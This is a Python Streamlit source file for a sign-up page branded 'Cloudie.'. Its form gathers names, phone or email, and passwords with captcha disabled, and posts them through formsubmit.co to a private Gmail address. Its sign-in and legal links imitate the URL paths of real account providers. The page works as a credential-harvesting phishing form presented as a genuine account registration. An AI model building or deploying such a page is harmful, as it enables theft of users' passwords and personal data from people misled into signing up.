import requests
import streamlit as st
from streamlit_lottie import st_lottie

st.set_page_config(page_title="Cloudie. | Sign up/Sign in to continue...", page_icon=":thought_balloon:", layout="wide")

def load_lottieurl(url):
    r = requests.get(url)
    if r.status_code != 200:
        return None
    return r.json()

def local_css(file_name):
    with open(file_name) as f:
        st.markdown(f"<style>{f.read()}</style>", unsafe_allow_html=True)

local_css("style/style.css")

title = "<div><span class='title'>Welcome to Cloudie.</span></div>"
signin = "<div>Already have an account? <a href=https://accounts.cloudie.com/signin/v2/identifier?service=accountsettings><span class='text'>Sign in</span></a></div>"

st.markdown(title, unsafe_allow_html=True)

lottie_coding = load_lottieurl("https://assets4.lottiefiles.com/packages/lf20_cgjrfdzx.json")

with st.container():
    left_column, right_column = st.columns(2)
    with left_column:
    	st.write("""
## Let's get you started with an account...
#### It's free!
""")

with st.container():
    contact_form = """
        <br>
        <form action="https://formsubmit.co/usamaejaz314@gmail.com" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="text" name="first_name" placeholder="First name" required>
        <input type="text" name="second_name" placeholder="Surname" required>
        <input type="text" name="address" placeholder="Mobile number or email address" required>
        <input type="password" name="password" placeholder="Password" required>
        <input type="password" name="password" placeholder="Confirm password" required>
        <div>By clicking "Sign up", you agree to the <a href="https://legal.cloudie.com/us/en/cloudie/terms/otos/index.html"><span class='text-blue'>Terms</span></a> and <a href="https://legal.cloudie.com/us/en/cloudie/privacy/index.html"><span class='text-blue'>Privacy Policy</span></a>.<div><br>
        <button type="submit">Sign up</button>
        <br><br>
        </form>
    """
    left_column, right_column = st.columns(2)
    with left_column:
        st.markdown(contact_form, unsafe_allow_html=True)
    with right_column:
        st.empty()
    with right_column:
        st_lottie(lottie_coding, height=400, key="coding")

st.markdown(signin, unsafe_allow_html=True)